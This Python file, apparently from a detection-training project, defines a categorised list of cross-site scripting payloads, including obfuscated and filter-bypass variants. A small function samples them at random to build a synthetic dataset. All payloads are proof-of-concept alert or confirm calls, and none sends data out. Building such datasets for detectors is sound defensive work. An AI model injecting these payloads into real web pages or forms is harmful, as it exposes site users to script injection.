# synthetic_xss.py — AI Core 26.0 (SAFE TRAINING EDITION)

import random

# ------------------------------------------------------------
# BASIC
# ------------------------------------------------------------
BASIC = [
    "<script>alert(1)</script>",
    "\"'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<marquee onstart=alert(1)>Hello</marquee>",
    "<script>alert(/xss/)</script>",
    "<img src=x onerror='alert(\"xss\")'>",
    "<div onmouseover=alert('xss')>Hover me</div>",
]

# ------------------------------------------------------------
# DOM
# ------------------------------------------------------------
DOM = [
    "<script>document.write('XSS')</script>",
    "<script>location.href='javascript:alert(1)'</script>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout('alert(1)',100)</script>",
    "<script>window['alert'](1)</script>",
    "<script>history.pushState({}, '', '/#xss')</script>",
    "<script>document.location.href='javascript:alert(1)'</script>",
    "<script>window.open('javascript:alert(1)')</script>",
]

# ------------------------------------------------------------
# HTML5
# ------------------------------------------------------------
HTML5 = [
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<canvas onmouseover=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<meter value=1 min=0 max=2 onmouseover=alert(1)>",
    "<video src=1 onerror='alert(\"xss\")' controls>Video</video>",
    "<audio src=1 onerror='alert(\"xss\")' controls>Audio</audio>",
    "<canvas onmouseover='alert(\"xss\")'>Canvas</canvas>",
]

# ------------------------------------------------------------
# EVENT HANDLERS
# ------------------------------------------------------------
EVENT_HANDLERS = [
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<button onclick=alert(1)>Click</button>",
    "<form onsubmit=alert(1)><input type=submit></form>",
    "<img src=x onmouseover=alert(1)>",
    "<body onhashchange=alert('xss')>#xss</body>",
    "<input autofocus onfocus='alert(\"xss\")' type=text>",
    "<button onclick='alert(\"xss\")'>Click me</button>",
]

# ------------------------------------------------------------
# SVG
# ------------------------------------------------------------
SVG = [
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<animate onbegin=alert(1)>",
    "<circle onfocus=alert(1) tabindex=1></circle>",
    "<svg><a xlink:href='javascript:alert(1)'>X</a></svg>",
    "<svg><script>/*<![CDATA[*/alert(1)//]]>*/</script></svg>",
    "<svg onload='alert(\"xss\")'>SVG</svg>",
    "<animate onbegin='alert(\"xss\")'>Animate</animate>",
]

# ------------------------------------------------------------
# OBFUSCATED
# ------------------------------------------------------------
OBFUSCATED = [
    "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
    "<scr&#x69;pt>alert(1)</scr&#x69;pt>",
    "<img src=x onerror=eval('\u0061\u006C\u0065\u0072\u0074(1)')>",
    "<iframe srcdoc='<script>/*&#x2F;*&#x2F;alert(1)//</script>'>",
]

# ------------------------------------------------------------
# ADVANCED
# ------------------------------------------------------------
ADVANCED = [
    "<details open ontoggle=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=stylesheet href='javascript:alert(1)'>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    "<object data='javascript:alert(1)' type='text/html'>Object</object>",
    "<embed src='javascript:alert(1)' type='text/html'>Embed</embed>",
    "<link rel='stylesheet' href='javascript:alert(1)'>Stylesheet</link>",
]

# ------------------------------------------------------------
# BYPASS FILTERS
# ------------------------------------------------------------
BYPASS_FILTERS = [
    "<img src=x onerror=alert`1`>",
    "<script>alert?.(1)</script>",
    "<script>confirm(1)</script>",
    "<img src=x onerror=window['alert'](1)>",
    "<svg><script>/*comment*/alert(1)</script></svg>",
    "<img src=x onerror=alert?.(1)>",
    "<script>confirm?.(1)</script>",
    "<svg><script>/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImNyomT5LmNyZWQiXX0K */alert(1)</script></svg>",
]

# ------------------------------------------------------------
# ALL GROUPS
# ------------------------------------------------------------
ALL_GROUPS = [
    BASIC,
    DOM,
    HTML5,
    EVENT_HANDLERS,
    SVG,
    OBFUSCATED,
    ADVANCED,
    BYPASS_FILTERS,
]

__all__ = [
    "BASIC",
    "DOM",
    "HTML5",
    "EVENT_HANDLERS",
    "SVG",
    "OBFUSCATED",
    "ADVANCED",
    "BYPASS_FILTERS",
    "ALL_GROUPS",
    "generate_synthetic_xss",
]

# ------------------------------------------------------------
# GENERATOR
# ------------------------------------------------------------
def generate_synthetic_xss(n: int = 2000):
    """Генерує n синтетичних XSS-прикладів з наданих користувачем патернів."""
    out = []
    for _ in range(n):
        group = random.choice(ALL_GROUPS)
        sample = random.choice(group)
        out.append(sample)
    return out


